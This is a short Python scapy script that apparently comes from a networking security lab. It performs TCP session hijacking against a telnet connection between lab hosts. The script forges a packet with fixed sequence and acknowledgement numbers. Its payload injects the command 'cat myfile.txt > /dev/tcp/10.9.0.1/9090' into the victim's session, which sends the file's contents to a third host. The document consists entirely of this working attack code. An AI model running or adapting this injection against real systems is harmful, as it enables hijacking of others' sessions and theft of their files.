#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=48802, dport=23, flags="A", seq=2741680483, ack=340260756)
data = "\r cat myfile.txt > /dev/tcp/10.9.0.1/9090 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
